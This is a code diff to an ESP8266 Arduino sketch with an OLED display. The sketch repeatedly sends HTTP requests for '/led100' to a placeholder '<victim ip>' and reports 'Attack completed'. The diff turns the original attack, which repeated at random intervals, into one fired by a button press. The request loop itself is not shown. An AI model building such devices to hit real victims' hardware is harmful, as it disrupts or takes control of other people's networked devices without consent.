@@ -6,9 +6,10 @@ extern "C" {
 #include "user_interface.h"
 }
 
-const char* ssid = "<SSID>";
-const char* password = "<Password>";
-const char* host = "<Victim IP>";
+int buttonApin = 14;  //D5
+const char* ssid = "<ssid>";
+const char* password = "<password>";
+const char* host = "<victim ip>";
 const uint16_t port = 80;
 String url = "/led100";
 long randNumber;
@@ -37,7 +38,8 @@ SSD1306 display(0x3c, 5, 4);   // GPIO 5 = D1, GPIO 4 = D2
 
 void setup() {
 
-  randomSeed(analogRead(15));
+  pinMode(buttonApin, INPUT_PULLUP);
+
   /* start Display */
   display.init();
   if (flipDisplay) display.flipScreenVertically();
@@ -72,11 +74,10 @@ void setup() {
   delay(10000);
   display.clear();
   display.display();
-  delay(600000);
 
 }
 
-void loop() {
+void attack(){
   int count = 0;
   do {
     display.clear();
@@ -128,12 +129,17 @@ void loop() {
 
     // Close the connection
     client.stop();
-    
+    delay(1000);
     } while (count < 90);
+    
     display.drawString(0, 40, "Attack completed");
     display.clear();
     delay(5000);
     display.display();
-    randNumber = random(300000, 600000);
-    delay(randNumber);
+}
+
+void loop() {
+  if (digitalRead(buttonApin) == LOW) {
+    attack();
+  }
 }
